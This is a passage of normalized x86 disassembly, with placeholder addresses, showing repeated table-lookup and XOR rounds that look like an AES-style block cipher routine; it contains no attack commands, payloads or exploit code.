movzx edi cl
mov ecx ebx
xor esi [ eax ]
mov edi [ edi * 4 + rw-data ]
shr ecx 0x8
movzx ecx cl
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x18
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x20 ]
xor edi [ ecx * 4 + rw-data ]
mov ecx edx
shr ecx 0x8
xor edi [ eax + 0x4 ]
mov [ ebp - 0x10 ] edi
movzx edi cl
mov ecx [ ebp - 0x20 ]
mov edi [ edi * 4 + rw-data ]
shr ecx 0x18
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x10
movzx ecx cl
xor edi [ ecx * 4 + rw-data ]
movzx ecx bl
shr ebx 0x18
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
mov ebx [ ebx * 4 + rw-data ]
shr ecx 0x10
movzx ecx cl
xor edi [ eax + 0x8 ]
xor ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
movzx ecx cl
xor ebx [ ecx * 4 + rw-data ]
movzx ecx dl
xor ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
xor ebx [ eax + 0xc ]
mov eax [ ebp + 0xc ]
mov [ eax + 0x8 ] edi
mov [ eax ] esi
pop edi
mov [ eax + 0xc ] ebx
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x8
mov ebx edi
shr ebx 0x18
mov [ ebp + 0x8 ] ebx
mov ebx esi
mov esi [ ebp + 0x8 ]
shr ebx 0x10
mov esi [ esi * 4 + rw-data ]
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
movzx ebx dl
xor esi [ ebx * 4 + rw-data ]
mov ebx edi
shr ebx 0x10
xor esi [ eax ]
add eax 0x10
mov [ ebp - 0x24 ] esi
movzx esi bl
mov ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x8
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
movzx ebx cl
shr ecx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edi
shr ebx 0x8
xor esi [ eax - 0xc ]
mov [ ebp - 0x20 ] esi
movzx esi bl
mov ebx [ esi * 4 + rw-data ]
mov esi [ ebp - 0xc ]
xor ebx [ ecx * 4 + rw-data ]
mov ecx edx
shr ecx 0x10
movzx ecx cl
shr esi 0x18
xor ebx [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
xor ebx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
shr ecx 0x10
movzx ecx cl
shr edx 0x8
xor esi [ ecx * 4 + rw-data ]
xor ebx [ eax - 0x8 ]
movzx ecx dl
mov edx ebx
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x8 ]
shr edx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx edx dl
xor esi [ eax - 0x4 ]
mov ecx esi
mov [ ebp - 0x18 ] esi
shr ecx 0x18
mov ecx [ ecx * 4 + rw-data ]
xor ecx [ edx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x8
movzx edx dl
xor ecx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x24 ]
xor ecx [ edx * 4 + rw-data ]
xor ecx [ eax ]
mov edx ecx
mov ecx esi
shr ecx 0x10
movzx esi cl
mov ecx ebx
mov [ ebp - 0x14 ] edx
shr ecx 0x8
mov esi [ esi * 4 + rw-data ]
movzx ecx cl
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x18
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x20 ]
xor esi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x18 ]
shr ecx 0x8
xor esi [ eax + 0x4 ]
movzx ecx cl
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0x20 ]
mov edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x10
shr esi 0x18
movzx ecx cl
xor edi [ esi * 4 + rw-data ]
xor edi [ ecx * 4 + rw-data ]
movzx ecx bl
shr ebx 0x18
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x10
xor edi [ eax + 0x8 ]
movzx ecx cl
mov [ ebp - 0xc ] edi
mov edi [ ebx * 4 + rw-data ]
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x24 ]
shr ecx 0x8
movzx ecx cl
mov esi [ ebp - 0xc ]
xor edi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
xor edi [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
xor edi [ eax + 0xc ]
add eax 0x10
mov [ ebp - 0x8 ] edi
sub_402314
push ebp
mov ebp esp
sub esp 0x24
push ebx
push esi
mov esi ecx
push edi
mov ecx [ ebp + 0x8 ]
mov edi [ esi + 0x4 ]
mov [ ebp - 0x4 ] edi
mov eax edi
add edi 0x7
shl eax 0x4
shl edi 0x4
mov ebx [ eax + esi + 0x68 ]
mov edx [ eax + esi + 0x6c ]
mov edi [ edi + esi ]
xor ebx [ ecx ]
xor edi [ ecx + 0x8 ]
xor edx [ ecx + 0x4 ]
add eax esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] edi
mov esi [ eax + 0x74 ]
add eax 0x158
xor esi [ ecx + 0xc ]
cmp [ ebp - 0x4 ] 0x6
mov [ ebp - 0x8 ] esi
jbe r-xdata
cmp [ ebp - 0x4 ] 0x4
jbe r-xdata
mov ecx esi
shr ecx 0x8
movzx esi cl
mov ecx edi
shr ecx 0x10
movzx edi cl
mov ecx [ esi * 4 + rw-data ]
mov esi edx
xor ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0xc ]
shr esi 0x18
shr edi 0x18
xor ecx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x8 ]
xor ecx [ esi * 4 + rw-data ]
shr ebx 0x10
movzx esi bl
mov ebx [ ebp - 0x14 ]
xor ecx [ eax ]
mov esi [ esi * 4 + rw-data ]
sub eax 0x10
xor esi [ edi * 4 + rw-data ]
shr ebx 0x8
movzx edi bl
mov [ ebp + 0x8 ] esi
mov ebx edx
xor esi [ edi * 4 + rw-data ]
movzx edi dl
shr ebx 0x8
xor esi [ edi * 4 + rw-data ]
movzx edi bl
xor esi [ eax + 0x14 ]
mov ebx [ ebp - 0x14 ]
shr ebx 0x10
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x8 ]
shr esi 0x18
shr edx 0x10
mov esi [ esi * 4 + rw-data ]
xor esi [ edi * 4 + rw-data ]
movzx edi [ ebp - 0xc ]
mov [ ebp + 0x8 ] esi
movzx esi bl
mov ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ edi * 4 + rw-data ]
shr ebx 0x8
xor esi [ eax + 0x18 ]
movzx edx dl
mov [ ebp - 0x1c ] esi
movzx esi bl
mov ebx [ ebp - 0x1c ]
mov esi [ esi * 4 + rw-data ]
xor esi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x18
shr ebx 0x10
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
movzx edi bl
xor esi [ edx * 4 + rw-data ]
xor esi [ eax + 0x1c ]
mov edx esi
mov [ ebp - 0x18 ] esi
shr edx 0x8
movzx edx dl
mov edx [ edx * 4 + rw-data ]
xor edx [ edi * 4 + rw-data ]
mov edi [ ebp - 0x20 ]
shr edi 0x18
xor edx [ edi * 4 + rw-data ]
movzx edi cl
xor edx [ edi * 4 + rw-data ]
xor edx [ eax ]
mov [ ebp - 0x14 ] edx
mov edx esi
shr edx 0x10
movzx edx dl
mov edi [ ebp - 0x1c ]
mov edx [ edx * 4 + rw-data ]
shr edi 0x18
mov ebx ecx
xor edx [ edi * 4 + rw-data ]
shr ebx 0x8
movzx edi bl
mov ebx [ ebp - 0x20 ]
xor edx [ edi * 4 + rw-data ]
movzx edi [ ebp - 0x20 ]
shr ebx 0x8
xor edx [ edi * 4 + rw-data ]
shr esi 0x18
movzx edi bl
mov esi [ esi * 4 + rw-data ]
mov ebx ecx
xor esi [ edi * 4 + rw-data ]
xor edx [ eax + 0x4 ]
shr ebx 0x10
movzx edi bl
mov ebx [ ebp - 0x1c ]
xor esi [ edi * 4 + rw-data ]
movzx edi [ ebp - 0x1c ]
shr ebx 0x8
xor esi [ edi * 4 + rw-data ]
shr ecx 0x18
xor esi [ eax + 0x8 ]
mov [ ebp - 0xc ] esi
movzx esi bl
mov ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx edi bl
mov ebx [ ebp - 0x14 ]
xor esi [ edi * 4 + rw-data ]
mov edi [ ebp - 0xc ]
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
xor esi [ ecx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax 0x10
mov [ ebp - 0x8 ] esi
mov ecx esi
push 0x10
shr ecx 0x8
movzx esi cl
mov ecx edi
shr ecx 0x10
movzx edi cl
mov ecx [ esi * 4 + rw-data ]
mov esi edx
xor ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0xc ]
shr esi 0x18
shr edi 0x18
xor ecx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x8 ]
xor ecx [ esi * 4 + rw-data ]
shr ebx 0x10
movzx esi bl
mov ebx [ ebp - 0x14 ]
xor ecx [ eax ]
mov esi [ esi * 4 + rw-data ]
xor esi [ edi * 4 + rw-data ]
shr ebx 0x8
movzx edi bl
mov ebx edx
xor esi [ edi * 4 + rw-data ]
movzx edi dl
shr ebx 0x8
xor esi [ edi * 4 + rw-data ]
movzx edi bl
xor esi [ eax + 0x4 ]
mov ebx [ ebp - 0x14 ]
shr ebx 0x10
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x8 ]
shr esi 0x18
shr edx 0x10
mov esi [ esi * 4 + rw-data ]
xor esi [ edi * 4 + rw-data ]
movzx edi bl
mov ebx [ ebp - 0xc ]
xor esi [ edi * 4 + rw-data ]
movzx edi bl
shr ebx 0x8
xor esi [ edi * 4 + rw-data ]
pop edi
movzx edx dl
xor esi [ eax + 0x8 ]
mov [ ebp - 0x1c ] esi
movzx esi bl
mov ebx [ ebp - 0x1c ]
mov esi [ esi * 4 + rw-data ]
xor esi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
shr edx 0x18
mov [ ebp + 0x8 ] edx
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
shr ebx 0x10
xor esi [ edx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax edi
mov edx esi
mov [ ebp - 0x18 ] esi
shr edx 0x8
movzx edx dl
movzx esi bl
mov edx [ edx * 4 + rw-data ]
mov ebx [ ebp - 0x18 ]
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x20 ]
shr esi 0x18
shr ebx 0x10
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x1c ]
xor edx [ eax ]
shr ebx 0x18
mov esi [ esi * 4 + rw-data ]
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x20 ]
shr ebx 0x8
xor esi [ eax + 0x4 ]
movzx ebx bl
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0x18 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x1c ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
shr ebx 0x8
xor esi [ eax + 0x8 ]
shr ecx 0x18
mov [ ebp - 0xc ] esi
movzx esi bl
mov ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
xor esi [ ecx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax edi
mov ecx esi
mov [ ebp - 0x8 ] esi
shr ecx 0x8
movzx ecx cl
movzx esi bl
mov ecx [ ecx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
xor ecx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x10 ]
shr esi 0x18
shr ebx 0x10
xor ecx [ esi * 4 + rw-data ]
movzx esi dl
xor ecx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0xc ]
xor ecx [ eax ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x8
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
xor esi [ eax + 0x4 ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
shr ebx 0x8
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x8
xor esi [ eax + 0x8 ]
shr edx 0x18
mov [ ebp - 0x1c ] esi
movzx esi bl
mov ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
shr ebx 0x10
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
xor esi [ edx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax edi
mov edx esi
mov [ ebp - 0x18 ] esi
shr edx 0x8
movzx edx dl
movzx esi bl
mov edx [ edx * 4 + rw-data ]
mov ebx [ ebp - 0x18 ]
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x20 ]
shr esi 0x18
shr ebx 0x10
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x1c ]
xor edx [ eax ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x20 ]
shr ebx 0x8
xor esi [ eax + 0x4 ]
movzx ebx bl
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0x18 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x1c ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
xor esi [ eax + 0x8 ]
mov [ ebp - 0xc ] esi
shr ebx 0x8
movzx esi bl
mov ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
shr ecx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
xor esi [ ecx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax edi
mov ecx esi
mov [ ebp - 0x8 ] esi
shr ecx 0x8
movzx ecx cl
movzx esi bl
mov ecx [ ecx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
xor ecx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x10 ]
shr esi 0x18
shr ebx 0x10
xor ecx [ esi * 4 + rw-data ]
movzx esi dl
xor ecx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0xc ]
xor ecx [ eax ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x8
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x8
xor esi [ eax + 0x4 ]
movzx ebx bl
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x8
xor esi [ eax + 0x8 ]
shr edx 0x18
mov [ ebp - 0x1c ] esi
movzx esi bl
mov ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
xor esi [ edx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax edi
mov edx esi
mov [ ebp - 0x18 ] esi
shr edx 0x8
mov ebx [ ebp - 0x1c ]
movzx edx dl
shr ebx 0x10
mov edx [ edx * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x18 ]
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x20 ]
shr esi 0x18
shr ebx 0x10
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x1c ]
xor edx [ eax ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x20 ]
shr ebx 0x8
xor esi [ eax + 0x4 ]
movzx ebx bl
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0x18 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x1c ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
shr ebx 0x8
xor esi [ eax + 0x8 ]
shr ecx 0x18
mov [ ebp - 0xc ] esi
movzx esi bl
mov ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
xor esi [ ecx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax edi
mov ecx esi
mov [ ebp - 0x8 ] esi
shr ecx 0x8
movzx ecx cl
movzx esi bl
mov ecx [ ecx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
xor ecx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x10 ]
shr esi 0x18
xor ecx [ esi * 4 + rw-data ]
movzx esi dl
xor ecx [ esi * 4 + rw-data ]
xor ecx [ eax ]
shr ebx 0x10
movzx esi bl
mov ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x8
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x8
xor esi [ eax + 0x4 ]
movzx ebx bl
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x8
xor esi [ eax + 0x8 ]
shr edx 0x18
mov [ ebp - 0x1c ] esi
movzx esi bl
mov ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
shr ebx 0x10
xor esi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
xor esi [ edx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax edi
mov edx esi
mov [ ebp - 0x18 ] esi
shr edx 0x8
movzx edx dl
movzx esi bl
mov edx [ edx * 4 + rw-data ]
mov ebx [ ebp - 0x18 ]
xor edx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x20 ]
shr esi 0x18
shr ebx 0x10
xor edx [ esi * 4 + rw-data ]
movzx esi cl
xor edx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x1c ]
xor edx [ eax ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x8
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
xor esi [ eax + 0x4 ]
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0x18 ]
shr esi 0x18
mov ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x8
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx ecx
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x1c ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1c ]
shr ebx 0x8
xor esi [ eax + 0x8 ]
shr ecx 0x18
mov [ ebp - 0xc ] esi
movzx esi bl
mov ebx [ ebp - 0x20 ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x10
movzx ebx bl
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
shr ebx 0x10
xor esi [ ecx * 4 + rw-data ]
movzx ecx [ ebp - 0x18 ]
xor esi [ ecx * 4 + rw-data ]
xor esi [ eax + 0xc ]
sub eax edi
mov ecx esi
mov [ ebp - 0x8 ] esi
shr ecx 0x8
movzx ecx cl
movzx esi bl
mov ecx [ ecx * 4 + rw-data ]
mov ebx [ ebp - 0x8 ]
xor ecx [ esi * 4 + rw-data ]
mov esi [ ebp - 0x10 ]
shr esi 0x18
shr ebx 0x10
xor ecx [ esi * 4 + rw-data ]
movzx esi dl
xor ecx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0xc ]
xor ecx [ eax ]
mov esi [ esi * 4 + rw-data ]
shr ebx 0x18
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x8
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0x10 ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x10 ]
shr ebx 0x8
xor esi [ eax + 0x4 ]
movzx ebx bl
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x8 ]
shr esi 0x18
mov esi [ esi * 4 + rw-data ]
xor esi [ ebx * 4 + rw-data ]
mov ebx edx
shr ebx 0x10
mov [ ebp + 0x8 ] esi
movzx esi bl
movzx ebx [ ebp - 0xc ]
mov esi [ esi * 4 + rw-data ]
xor [ ebp + 0x8 ] esi
mov esi [ ebp + 0x8 ]
xor esi [ ebx * 4 + rw-data ]
xor esi [ eax + 0x8 ]
mov [ ebp - 0x1c ] esi
mov ebx [ ebp - 0xc ]
shr ebx 0x8
movzx esi bl
mov ebx [ ebp - 0x10 ]
shr ebx 0x10
movzx ebx bl
mov [ ebp + 0x8 ] ebx
mov ebx [ esi * 4 + rw-data ]
mov esi [ ebp + 0x8 ]
shr edx 0x18
xor ebx [ esi * 4 + rw-data ]
xor ebx [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x8 ]
xor ebx [ edx * 4 + rw-data ]
xor ebx [ eax + 0xc ]
sub eax edi
mov edx ebx
shr edx 0x8
movzx esi dl
mov edx [ ebp - 0x1c ]
mov esi [ esi * 4 + rw-data ]
shr edx 0x10
movzx edx dl
xor esi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x18
xor esi [ edx * 4 + rw-data ]
movzx edx cl
xor esi [ edx * 4 + rw-data ]
mov edx ebx
shr edx 0x10
movzx edi dl
mov edx [ ebp - 0x1c ]
xor esi [ eax ]
mov edi [ edi * 4 + rw-data ]
shr edx 0x18
xor edi [ edx * 4 + rw-data ]
mov edx ecx
shr edx 0x8
movzx edx dl
xor edi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x20 ]
xor edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x20 ]
shr edx 0x8
xor edi [ eax + 0x4 ]
movzx edx dl
mov [ ebp - 0x10 ] edi
mov edi ebx
shr edi 0x18
mov edi [ edi * 4 + rw-data ]
xor edi [ edx * 4 + rw-data ]
mov edx ecx
shr edx 0x10
movzx edx dl
shr ecx 0x18
xor edi [ edx * 4 + rw-data ]
movzx edx [ ebp - 0x1c ]
xor edi [ edx * 4 + rw-data ]
mov edx [ ebp - 0x1c ]
shr edx 0x8
xor edi [ eax + 0x8 ]
mov [ ebp - 0xc ] edi
movzx edi dl
mov edx [ ebp - 0x20 ]
shr edx 0x10
movzx edx dl
mov [ ebp + 0x8 ] edx
mov edx [ edi * 4 + rw-data ]
mov edi [ ebp + 0x8 ]
xor edx [ edi * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
movzx ecx bl
xor edx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0x10 ]
xor edx [ eax + 0xc ]
mov eax [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
pop edi
pop esi
mov [ eax + 0xc ] edx
pop ebx
leave
retn 0x8
mov ecx esi
shr ecx 0x8
movzx esi cl
mov ecx edi
shr ecx 0x10
movzx edi cl
mov ecx [ esi * 4 + rw-data ]
mov esi edx
xor ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0xc ]
shr esi 0x18
shr edi 0x18
xor ecx [ esi * 4 + rw-data ]
movzx esi bl
mov ebx [ ebp - 0x8 ]
xor ecx [ esi * 4 + rw-data ]
shr ebx 0x10
movzx esi bl
mov ebx [ ebp - 0x14 ]
xor ecx [ eax ]
mov esi [ esi * 4 + rw-data ]
sub eax 0x10
xor esi [ edi * 4 + rw-data ]
shr ebx 0x8
movzx edi bl
mov [ ebp + 0x8 ] esi
mov ebx edx
xor esi [ edi * 4 + rw-data ]
movzx edi dl
shr ebx 0x8
xor esi [ edi * 4 + rw-data ]
movzx edi bl
xor esi [ eax + 0x14 ]
mov ebx [ ebp - 0x14 ]
shr ebx 0x10
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x8 ]
shr esi 0x18
shr edx 0x10
mov esi [ esi * 4 + rw-data ]
xor esi [ edi * 4 + rw-data ]
movzx edi [ ebp - 0xc ]
